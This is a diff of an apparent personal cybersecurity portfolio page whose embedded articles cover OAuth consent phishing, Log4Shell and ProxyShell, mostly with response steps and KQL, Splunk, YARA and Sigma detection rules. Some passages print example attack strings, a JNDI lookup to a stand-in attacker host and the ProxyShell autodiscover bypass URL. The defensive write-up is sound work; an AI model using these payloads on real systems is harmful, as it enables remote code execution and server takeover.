+        <span class="mitre-tag">T1098.003 — Additional Cloud Credentials</span>
+      </div>
+      <h3>Methodology</h3>
+      <p>Threat actor uses device code flow phishing, mimicking legitimate Microsoft login. Bypasses MFA entirely by stealing already-authenticated refresh tokens. Registers persistent application in victim's Azure AD tenant.</p>
+      <h3>Impact</h3>
+      <p>Full cloud mailbox compromise, stealthy persistence without password reset, data exfiltration from SharePoint and OneDrive without triggering DLP policies.</p>
+      <h3>Response Actions</h3>
+      <p>Revoke all malicious OAuth grants via Entra portal. Enforce Conditional Access: block legacy auth, require compliant devices. Implement FIDO2 hardware keys. Audit enterprise application permissions quarterly.</p>
+      <h3>Detection Queries</h3>
+      <pre>// KQL — Unusual OAuth Consent (Sentinel/Defender)
 AADSignInEventsBeta
 | where ConsentProvidedForApp == true
-| where AppDisplayName !in (known_allowlist)
-| project Timestamp, User, AppDisplayName, IPAddress</pre>
-      `
-    },
-    {
-      id: "log4shell",
-      title: "Log4Shell (CVE-2021-44228) Methodology & IR",
-      date: "January 2025",
-      excerpt: "JNDI injection deep-dive, post-exploitation techniques, YARA rules, and containment playbook.",
-      content: `
-        <h2>Log4Shell Exploitation & Defense</h2>
-        <h3>Attack Chain</h3>
-        <p>Adversary injects \${jndi:ldap://malicious.com/exploit} into HTTP headers → vulnerable log4j2 performs lookup → remote class loading → RCE.</p>
-        <h3>Methodology</h3>
-        <p>Scan for log4j 2.x ≤2.14.1, deliver payload via User-Agent/X-Forwarded-For headers, callback to LDAP server, deploy crypto miners or reverse shell.</p>
-        <h3>Impact</h3>
-        <p>Full system compromise, ransomware deployment, data theft across cloud and on-prem servers affecting thousands of applications.</p>
-        <h3>Response Actions</h3>
-        <p>Patch immediately, set log4j2.formatMsgNoLookups=true, remove JndiLookup class from jar files, deploy WAF signatures for \${jndi:} patterns.</p>
-        <h3>Detection Queries</h3>
-        <pre># YARA rule for Log4j exploitation
-rule Log4j_Exploit {
-    strings:
-        $a = /\$\{jndi:(ldap|rmi|dns):\/\// nocase
-    condition:
-        $a
+| where AppDisplayName !in (known_apps_allowlist)
+| where IPAddress !in (corporate_ips)
+| project Timestamp, UserPrincipalName, AppDisplayName, IPAddress, Location
+| order by Timestamp desc
+
+// KQL — Inbox Rule Created by Non-Owner
+OfficeActivity
+| where Operation == "New-InboxRule"
+| where UserId != MailboxOwnerUPN
+| project TimeGenerated, UserId, Parameters
+
+// SPL — Device Code Phishing
+index=o365 Operation=UserLoggedIn AuthenticationMethod="DeviceCode"
+| stats count by src_user, src_ip, app</pre>
+    `
+  },
+  {
+    id:'log4shell',cat:'CVE / RCE',
+    title:'Log4Shell (CVE-2021-44228) Methodology & IR',
+    date:'January 2025',
+    excerpt:'JNDI injection deep-dive, post-exploitation techniques, YARA rules, and a full containment playbook.',
+    mitre:['T1190','T1059','T1105'],
+    content:`
+      <h2>Log4Shell — JNDI Injection & Full Exploitation Chain</h2>
+      <p class="modal-date"><i class="fas fa-calendar-alt"></i> &nbsp;January 2025</p>
+      <hr>
+      <h3>Attack Chain</h3>
+      <p>Adversary injects <code style="background:rgba(0,255,198,0.08);padding:2px 6px;border-radius:4px;font-family:var(--mono);font-size:12px">\${jndi:ldap://attacker.com/x}</code> into HTTP headers (User-Agent, X-Forwarded-For, X-Api-Version). Vulnerable log4j2 performs remote lookup → LDAP redirects to attacker RMI server → remote class loading → RCE on target JVM.</p>
+      <h3>MITRE ATT&CK Coverage</h3>
+      <div class="mitre-grid">
+        <span class="mitre-tag">T1190 — Exploit Public-Facing Application</span>
+        <span class="mitre-tag">T1059.007 — JavaScript/JScript</span>
+        <span class="mitre-tag">T1105 — Ingress Tool Transfer</span>
+        <span class="mitre-tag">T1071 — Application Layer Protocol</span>
+      </div>
+      <h3>Post-Exploitation</h3>
+      <p>Crypto miner deployment, reverse shell via Netcat/Cobalt Strike beacon, pivoting to internal cloud metadata service, credential harvesting from JVM heap dumps.</p>
+      <h3>Response Actions</h3>
+      <p>Patch to log4j2 ≥2.17.1 immediately. Interim: set -Dlog4j2.formatMsgNoLookups=true. Remove JndiLookup.class from jar files. Deploy WAF rule blocking \${jndi: patterns. Hunt for DNS callouts to unknown LDAP/RMI endpoints.</p>
+      <h3>Detection Rules</h3>
+      <pre># YARA — Log4Shell Exploitation Attempt
+rule Log4j_JNDI_Exploit {
+  meta:
+    description = "Detects Log4Shell exploitation in HTTP logs"
+    severity = "CRITICAL"
+  strings:
+    $a = /\$\{jndi:(ldap|rmi|dns|iiop|corba|nds):\/\// nocase
+    $b = "\${lower:" nocase
+    $c = "\${upper:" nocase
+  condition:
+    $a or ($b and $c)
 }
-# Splunk query for hunting
-index=* "\\${jndi:ldap" OR "jndi:rmi" OR "jndi:dns"</pre>
-      `
-    },
-    {
-      id: "proxyshell",
-      title: "ProxyShell: Exchange Pre-auth RCE Chain",
-      date: "December 2024",
-      excerpt: "SSRF to PowerShell remoting to webshell deployment, detection rules, and hardening strategies.",
-      content: `
-        <h2>ProxyShell Attack Chain: Microsoft Exchange</h2>
-        <h3>Attack Chain</h3>
-        <p>Autodiscover SSRF (CVE-2021-34473) → PowerShell Remoting (CVE-2021-34523) → write webshell (CVE-2021-31207).</p>
-        <h3>Methodology</h3>
-        <p>Attacker crafts malicious POST request to /autodiscover/autodiscover.json?Email= parameter to bypass authentication, then uses Exchange Management to execute commands and deploy webshells.</p>
-        <h3>Impact</h3>
-        <p>Full Exchange server compromise, persistent webshell backdoor, mailbox theft, lateral movement to domain controllers across the organization.</p>
-        <h3>Response Actions</h3>
-        <p>Apply cumulative updates immediately, remove malicious .asp webshells from /aspnet_client directory, reset IIS application pools, audit mail forwarding rules.</p>
-        <h3>Detection Queries</h3>
-        <pre>// IIS logs - Suspicious POST to autodiscover
-// Sigma: Suspicious Exchange PowerShell activity
-EventID: 4 (PowerShell) 
-| where CommandLine contains "New-MailboxExportRequest" or CommandLine contains "Get-Mailbox"</pre>
-      `
-    }
-  ];
 
-  function renderBlogs() {
-    const container = document.getElementById('blogGridContainer');
-    if (!container) return;
-    container.innerHTML = '';
-    researchArticles.forEach(article => {
-      const card = document.createElement('div');
-      card.className = 'blog-card';
-      card.setAttribute('data-aos', 'fade-up');
-      card.innerHTML = `
-        <h3>${article.title}</h3>
-        <div class="blog-meta"><i class="far fa-calendar-alt"></i> ${article.date}</div>
-        <p>${article.excerpt.substring(0, 110)}...</p>
-        <a class="read-link" data-id="${article.id}">Read full research <i class="fas fa-arrow-right"></i></a>
-      `;
-      container.appendChild(card);
-    });
-    document.querySelectorAll('.read-link').forEach(link => {
-      link.addEventListener('click', (e) => {
-        e.preventDefault();
-        const id = link.getAttribute('data-id');
-        const article = researchArticles.find(a => a.id === id);
-        if (article) openModal(article.content, article.title);
+// Splunk — Hunt for JNDI probe
+index=proxy sourcetype=access_combined
+(uri_query="*jndi:ldap*" OR cs_uri_query="*jndi:rmi*"
+ OR cs_referer="*jndi:dns*")
+| stats count by src_ip, dest, cs_uri_query, _time
+| sort -count</pre>
+    `
+  },
+  {
+    id:'proxyshell',cat:'Exchange / RCE',
+    title:'ProxyShell: Exchange Pre-Auth RCE Chain',
+    date:'December 2024',
+    excerpt:'SSRF to PowerShell remoting to webshell deployment — detection rules and hardening for Microsoft Exchange.',
+    mitre:['T1190','T1059.001','T1505.003'],
+    content:`
+      <h2>ProxyShell — Microsoft Exchange RCE Chain</h2>
+      <p class="modal-date"><i class="fas fa-calendar-alt"></i> &nbsp;December 2024</p>
+      <hr>
+      <h3>CVE Chain</h3>
+      <p>CVE-2021-34473 (SSRF / auth bypass) → CVE-2021-34523 (PowerShell remoting privilege escalation) → CVE-2021-31207 (write arbitrary webshell via mailbox export).</p>
+      <h3>MITRE ATT&CK Coverage</h3>
+      <div class="mitre-grid">
+        <span class="mitre-tag">T1190 — Exploit Public-Facing App</span>
+        <span class="mitre-tag">T1059.001 — PowerShell</span>
+        <span class="mitre-tag">T1505.003 — Web Shell</span>
+        <span class="mitre-tag">T1021.006 — WinRM</span>
+      </div>
+      <h3>Methodology</h3>
+      <p>Attacker sends malicious POST to /autodiscover/autodiscover.json?Email=autodiscover/autodiscover.json%3F@victim.com to bypass auth. Then uses Exchange Management PowerShell to schedule mailbox export to .aspx path, deploying a webshell in /aspnet_client/.</p>
+      <h3>Impact</h3>
+      <p>Full Exchange server compromise, persistent webshell access, mailbox data theft, lateral movement to domain controllers. Widely exploited by ransomware groups and nation-state actors.</p>
+      <h3>Response Actions</h3>
+      <p>Apply Exchange CU immediately. Remove .asp/.aspx/.ashx files from /aspnet_client/ and /OWA/ directories. Reset IIS app pools. Revoke all PendingRequests in EMS. Audit New-MailboxExportRequest logs.</p>
+      <h3>Detection Rules</h3>
+      <pre>// Sigma — ProxyShell Autodiscover Abuse
+title: ProxyShell Exploitation Attempt
+logsource:
+  product: iis
+detection:
+  selection:
+    cs-method: POST
+    cs-uri-stem|contains:
+      - '/autodiscover/autodiscover.json'
+      - '/autodiscover/autodiscover.xml'
+    cs-uri-query|contains: '@'
+  condition: selection
+level: critical
+
+// KQL — Mailbox Export to Webshell Path
+SecurityEvent
+| where EventID == 4104
+| where ScriptBlockText contains "New-MailboxExportRequest"
+  and ScriptBlockText contains "aspnet_client"
+| project TimeGenerated, Computer, SubjectUserName, ScriptBlockText
+
+// SPL — Webshell Created on Exchange
+index=wineventlog EventCode=11
+| where TargetFilename LIKE "%.aspx"
+  AND (TargetFilename LIKE "%aspnet_client%" OR TargetFilename LIKE "%OWA%")
+| table _time, host, TargetFilename, ProcessId</pre>
+    `
+  }
+];
+
+function buildBlogs(){
+  const grid=document.getElementById('blogGrid');
+  blogs.forEach((b,i)=>{
+    const card=document.createElement('div');
+    card.className='blog-card reveal';
+    card.style.transitionDelay=(i*.1)+'s';
+    card.innerHTML=`
+      <div class="blog-cat"><i class="fas fa-bug" style="font-size:11px"></i>${b.cat}</div>
+      <div class="blog-title">${b.title}</div>
+      <div class="blog-meta"><i class="far fa-calendar-alt"></i> ${b.date}</div>
+      <div class="blog-excerpt">${b.excerpt}</div>
+      <div class="blog-footer">
+        <span class="blog-read">Read Analysis <i class="fas fa-arrow-right"></i></span>
+        <div class="blog-tags">${b.mitre.map(m=>`<span class="blog-tag">${m}</span>`).join('')}</div>
+      </div>`;
+    card.addEventListener('click',()=>openModal(b));
+    grid.appendChild(card);
+  });
+}
+buildBlogs();
+
+/* ── MODAL ── */
+const modal=document.getElementById('modal');
+const modalBody=document.getElementById('modalBody');
+document.getElementById('modalClose').addEventListener('click',()=>modal.classList.remove('open'));
+modal.addEventListener('click',e=>{if(e.target===modal)modal.classList.remove('open')});
+document.addEventListener('keydown',e=>{if(e.key==='Escape')modal.classList.remove('open')});
+function openModal(b){
+  modalBody.innerHTML=b.content;
+  modal.classList.add('open');
+  modal.scrollTop=0;
+}
+
+/* ── SCROLL REVEAL + SKILL BARS + COUNT-UP ── */
+const observer=new IntersectionObserver(entries=>{
+  entries.forEach(e=>{
+    if(e.isIntersecting){
+      e.target.classList.add('visible');
+      // skill bars
+      e.target.querySelectorAll('.skill-bar-fill').forEach(bar=>{
+        bar.style.width=bar.dataset.w+'%';
       });
-    });
-  }
-
-  const modal = document.getElementById('researchModal');
-  const modalContentDiv = document.getElementById('modalDynamicContent');
-  const closeModalBtn = document.querySelector('.close-modal');
-  const backLinkModal = document.getElementById('modalBackLink');
-
-  function openModal(htmlContent, titleText) {
-    modalContentDiv.innerHTML = `
-      <h2 style="margin-bottom: 1rem; font-size: 1.8rem;">${titleText}</h2>
-      <div>${htmlContent}</div>
-    `;
-    modal.style.display = 'flex';
-    document.body.style.overflow = 'hidden';
-  }
-
-  function closeModalFunc() {
-    modal.style.display = 'none';
-    document.body.style.overflow = 'auto';
-  }
-
-  closeModalBtn.addEventListener('click', closeModalFunc);
-  window.addEventListener('click', (e) => {
-    if (e.target === modal) closeModalFunc();
+      // count up
+      e.target.querySelectorAll('[data-count]').forEach(el=>{
+        const target=+el.dataset.count;
+        const suffix=el.dataset.suffix||'';
+        let start=0;const dur=1400;const step=dur/target;
+        const interval=setInterval(()=>{
+          start++;el.textContent=start+suffix;
+          if(start>=target)clearInterval(interval);
+        },step);
+      });
+      // terminal
+      if(e.target.classList.contains('terminal'))startTerminal();
+    }
   });
-  backLinkModal.addEventListener('click', (e) => {
-    e.preventDefault();
-    closeModalFunc();
+},{threshold:.15});
+document.querySelectorAll('.reveal,.terminal').forEach(el=>observer.observe(el));
+
+/* ── ACTIVE NAV ── */
+const sections=document.querySelectorAll('section[id]');
+const navLinks=document.querySelectorAll('.nav-links a');
+window.addEventListener('scroll',()=>{
+  let cur='';
+  sections.forEach(s=>{if(window.scrollY>=s.offsetTop-120)cur=s.id});
+  navLinks.forEach(a=>{
+    a.classList.toggle('active',a.getAttribute('href')==='#'+cur);
   });
+});
 
-  const resumeBtn = document.getElementById('resumeDownloadBtn');
-  if (resumeBtn) {
-    resumeBtn.addEventListener('click', (e) => {
-      e.preventDefault();
-      alert("Resume: Swetha_Devi_Cybersecurity_Resume.pdf would be available here. Replace with your actual resume PDF in the repository root.");
-    });
-  }
-
-  document.querySelectorAll('.nav-links a, .button-group a[href^="#"]').forEach(anchor => {
-    anchor.addEventListener('click', function(e) {
-      const hash = this.getAttribute('href');
-      if (hash && hash !== '#') {
-        e.preventDefault();
-        const target = document.querySelector(hash);
-        if (target) {
-          target.scrollIntoView({ behavior: 'smooth', block: 'start' });
-        }
-      }
-    });
-  });
-
-  renderBlogs();
+/* ── RESUME BTN ── */
+document.getElementById('dlResume').addEventListener('click',e=>{
+  e.preventDefault();
+  alert('Place your resume PDF as "Swetha_Devi_Resume.pdf" in the repository root and update this link.');
+});
 </script>
 </body>
 </html>
